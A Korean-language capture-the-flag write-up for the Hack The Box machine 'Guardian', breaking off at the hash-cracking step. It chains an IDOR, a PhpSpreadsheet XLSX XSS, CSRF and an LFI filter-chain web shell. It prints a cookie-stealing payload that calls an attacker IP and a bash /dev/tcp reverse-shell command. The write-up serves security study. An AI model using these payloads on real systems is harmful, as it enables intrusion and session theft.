![Guardian](/assets/htb-linux/guardian/guardian.png)

**Guardian**은 Hard 난이도의 Linux 머신으로, 초기 진입점은 학생 포털의 기본 비밀번호인 `GU1234`와 `IDOR` 취약점을 이용해 다른 사용자의 데이터를 열람하고, 이를 통해 숨겨진 `Gitea` 서브도메인과 자격 증명을 확보하는 것이다. Gitea에 공개된 소스코드에서 취약한 `PhpSpreadsheet` 버전을 확인한 뒤, **XLSX 기반 XSS 취약점**을 과제 제출 기능에 악용하여 **Lecturer → Admin** 권한까지 상승하고, 데이터베이스 설정과 `salt`가 포함된 해시 로직을 분석해 `sha256(password + salt)` 형식의 패스워드를 크랙함으로써 시스템 사용자 계정으로 이동한다.

이후 `sudo`로 실행 가능한 Python 스크립트가 쓰기 가능한 모듈을 `import`하는 점을 이용해 **모듈 하이재킹** 으로 다음 사용자(`mark`)까지 권한을 확장한다. 마지막 단계에서는 `mark` 계정의 커스텀 바이너리인 `safeapache2ctl`을 Ghidra 등으로 리버싱하여, 설정 파일을 `/home/mark/confs/`로 제한하는 것처럼 보이지만 `LoadModule` 및 `Include` 디렉티브의 **상대경로에 대한 검증이 부실**하다는 점을 찾아낸다. 이를 악용해 공격자가 작성한 악성 모듈과 특수한 Apache 설정을 조합하면, `safeapache2ctl -f` 실행 시 **root 권한의 Apache**가 해당 모듈을 로드하게 되고, 최종적으로 루트 권한을 탈취할 수 있다.

![로그인 페이지](/assets/htb-linux/guardian/login.png)

가이드 내용을 분석해본 결과, **기본 비밀번호는 `GU1234`**로 설정되어 있는 것을 확인할 수 있다.

![가이드 내용 분석](/assets/htb-linux/guardian/guide.png)

메인 페이지 하단의 **Student Testimonials** 섹션에는 학생들의 이름과 이메일 주소가 포함되어 있다.

이메일 형식은 `학번@guardian.htb` 패턴을 따르고 있으며, 이를 통해 학번 형식의 사용자 ID 를 유추할 수 있다.

앞서 수집한 사용자 ID 중 하나를 이용해 로그인 시도를 진행한 결과, `Boone Basden` 학생의 계정(`GU0142023`)으로 포털에 성공적으로 접속할 수 있었다.

왼쪽 메뉴의 `Chats` 항목을 클릭하면, 사용자의 개인 메시지함으로 이동하게 된다.

![채팅 화면](/assets/htb-linux/guardian/chats-url.png)

`chat_users[]` 파라미터의 숫자를 수동으로 변경해 보았다:

![IDOR](/assets/htb-linux/guardian/chats-idor.png)

그 결과, 관리자와 `jamil.enockson` 사용자의 채팅 내용이 노출되었으며, 해당 대화에서는 다음과 같은 메시지가 포함되어 있었다:

이를 통해 **IDOR 취약점을 이용해 jamil.enockson 계정의 비밀번호를 탈취**하는 데 성공하였다.

## XSS - PhpSpreadsheet POC

레포지토리 내 `composer.json` 파일을 확인하던 중, 의존성 구성이 발견되었다:

```json
{
    "require": {
        "phpoffice/phpspreadsheet": "3.7.0",
        "phpoffice/phpword": "^1.3"
    }
}
```

여기서 사용된 `phpoffice/phpspreadsheet` 라이브러리의 3.7.0 버전은 XSS 취약점이 존재하는 것으로 알려져 있으며, 공식적으로 공개된 **[CVE‑2024‑56410](https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229)**도 존재한다.

이후 실제 `portal.guardian.htb` 레포지토리의 `vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Writer/Html.php` 경로에서 아래와 같은 `generateMeta()` 함수 코드를 발견할 수 있었다:

```php
    private static function generateMeta(?string $val, string $desc): string
    {
        return ($val || $val === '0')
            ? ('      <meta name="' . $desc . '" content="' . htmlspecialchars($val, Settings::htmlEntityFlags()) . '" />' . PHP_EOL)
            : '';
    }
```

이 함수는 Excel 문서의 커스텀 메타데이터를 HTML `<meta>` 태그로 변환해 출력하는 역할을 한다.

문제는 **`$desc` 값이 `htmlspecialchars()` 와 같은 필터링 없이 그대로 HTML** 에 삽입된다는 점이다.

따라서 `$desc` 값에 `"><img src=x onerror=alert(1)>` 같은 XSS payload가 포함되면, 해당 HTML을 렌더링할 때 스크립트가 실행될 수 있는 **XSS 취약점**이 발생하게 된다.

`portal.guardian.htb` 웹 페이지를 다시 확인하던 중, 과제 제출 시 `.docx` 또는 `.xlsx` 파일을 첨부할 수 있는 기능이 있다는 것을 발견하였다:

![첨부 가능 확인](/assets/htb-linux/guardian/upload.png)

Excel 문서를 생성한 후, 시트의 제목 입력란에 다음과 같은 XSS 페이로드를 삽입하였다:

```html
Sheet1
Sheet2
"><img src=x onerror="new Image().src='http://10.10.14.120:8000/?c='+document.cookie">
```

이후, 로컬에서 간단한 Python 기반 HTTP 서버를 구동하였다:

```bash
$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

페이로드가 담긴 Excel 문서를 업로드하면, 서버 측에서 해당 문서를 처리하는 과정 중 **JavaScript가 실행**되며 내 로컬 HTTP 서버로 쿠키 정보가 전송된다.

![쿠키 탈취](/assets/htb-linux/guardian/cookie.png)

수집된 쿠키를 세션에 삽입한 결과, `Lecturer Portal` 계정으로 로그인된 상태로 접근할 수 있었다.

![Lecturer 로그인 성공](/assets/htb-linux/guardian/lecturer.png)

## CSRF

이후 **Notice Board → Create Notice** 메뉴로 이동하면, 공지사항을 작성할 수 있는 화면이 나타난다.

해당 페이지를 유심히 살펴보면, 하단의 `Reference Link` 입력란에 다음과 같은 문구가 적혀 있는 것을 확인할 수 있다:

![취약점 확인](/assets/htb-linux/guardian/create-notice.png)

이는 입력한 링크가 **관리자(admin)** 에 의해 검토된다는 뜻으로, 관리자가 해당 링크에 직접 접근할 가능성이 있다는 점을 알 수 있다.

관리자가 해당 링크에 접근할 때, 의도치 않게 **관리자 권한의 계정을 생성**하거나, 회원 정보의 `role` 값을 `admin` 으로 변경하게 만드는 등의 시나리오를 고려하여 **CSRF 취약점 가능성을 탐색**하였다.

해당 파일은 관리자만 접근 가능한 사용자 생성 페이지로, POST 요청 시 전달되는 `csrf_token` 의 유효성 검증과 함께 사용자의 역할을 포함한 여러 정보들을 받아 처리하는 구조로 되어 있다.

여기서 `require` 되고 있는 `../config/csrf-tokens.php` 파일을 통해 CSRF 토큰이 어떻게 처리되는지에 대한 코드를 확인할 수 있었다:

```php
<?php

$global_tokens_file = __DIR__ . '/tokens.json';

function get_token_pool()
{
    global $global_tokens_file;
    return file_exists($global_tokens_file) ? json_decode(file_get_contents($global_tokens_file), true) : [];
}

function add_token_to_pool($token)
{
    global $global_tokens_file;
    $tokens = get_token_pool();
    $tokens[] = $token;
    file_put_contents($global_tokens_file, json_encode($tokens));
}

function is_valid_token($token)
{
    $tokens = get_token_pool();
    return in_array($token, $tokens);
}
```

해당 CSRF 토큰 구현은 **토큰이 재사용 가능하고 사용자 세션과도 연동되지 않아**, 공격자가 손쉽게 토큰을 악용할 수 있는 구조적 취약성을 가지고 있다.

Create Notice 페이지에서 **`csrf_token` 이 HTML 내에 포함되어 있는 것을 확인**할 수 있었다.

## LFI

`Reports` 메뉴에 접근한 뒤 **하위 항목 중 하나를 클릭**하면, URL에 `report=reports/enrollment.php` 와 같은 파라미터가 전달되는 것을 확인할 수 있었다.

![Reports](/assets/htb-linux/guardian/reports.png)

이는 사용자가 선택한 보고서 파일을 서버 측에서 `include` 시킨다는 의미이며, 해당 파라미터(`report`)에 조작된 값을 삽입함으로써 **LFI 취약점을 유도할 수 있는 구조**임을 암시한다.

Gitea를 통해 `reports.php` 의 소스코드를 확인해보면, 다음과 같은 내용을 확인할 수 있다:

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>

#...[SKIP]...
```

위 코드에서 `$_GET['report']` 값을 기반으로 파일을 포함하고 있으며, 일부 필터링 로직은 존재하지만 제한적인 패턴 검증과 디렉터리 탐색 차단만을 수행하고 있어 LFI 우회 가능성이 존재한다.

간단한 PHP 테스트 코드를 통해 필터링 우회 가능성을 검토하였다:

```php
<?php
$report = "??";

if (strpos($report, '..') !== false) {
    die("Malicious request blocked: $report\n");
}

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("Access denied. Invalid file: $report\n");
}

echo "Success: $report\n";
?>
```

해당 코드에서 `$report` 변수에 다양한 값을 적용하여 테스트한 결과, 아래와 같은 패턴이 확인되었다:

```text
Success: academic.php
--
Access denied. Invalid file: academic.php,academic
---
Access denied. Invalid file: abcd.php
--
Success: abcd.php,academic.php
--
Malicious request blocked: abcd.php,..academic.php
```

**입력값에 정규표현식에서 허용하는 키워드가 포함되기만 하면 앞에 다른 파일명을 추가하더라도 필터링을 우회할 수 있음**을 확인하였다. 다만, **`..`이 포함된 경우는 명시적으로 차단**되며, 정규식의 끝이 `.php`로 정확히 끝나지 않으면 우회되지 않는다.

우회된 페이로드 생성을 위해 아래 명령어를 사용하였다:

```bash
python3 php_filter_chain_generator.py --chain "<?php system('id')?>"
```

# Exploitation

## Web Shell (LFI)

앞서 확인된 우회 기법을 활용하여, PHP 필터 체인을 새롭게 구성하고 웹 셸 실행을 시도하였다:

```bash
$ python3 php_filter_chain_generator.py --chain "<?php system($_GET['c'])?>"
```

로컬 머신에서는 `Netcat` 을 통해 리버스 셸 연결을 수신할 수 있도록 대기 상태로 설정하였다:

```bash
$ nc -lvnp 9001
```

이후, 취약한 파라미터에 다음과 같은 우회된 `php://filter/...` URI를 삽입하고, `c` 파라미터를 통해 리버스 셸 명령을 전달하였다:

```text
php://filter/.../resource=php://temp,system.php&c=bash -c 'bash -i >%26 /dev/tcp/10.10.14.184/9001 0>%261'
```

정상적으로 웹 서버에서 명령이 실행되었고, 아래와 같이 `www-data` 권한으로 리버스 셸 접속에 성공하였다:

### HashCrack

이전에 확보한 사용자 해시 정보와 `config.php` 에서 확인한 솔트 값을 기반으로, 해시 크랙을 위한 `hash.txt` 파일을 다음과 같이 구성하였다:
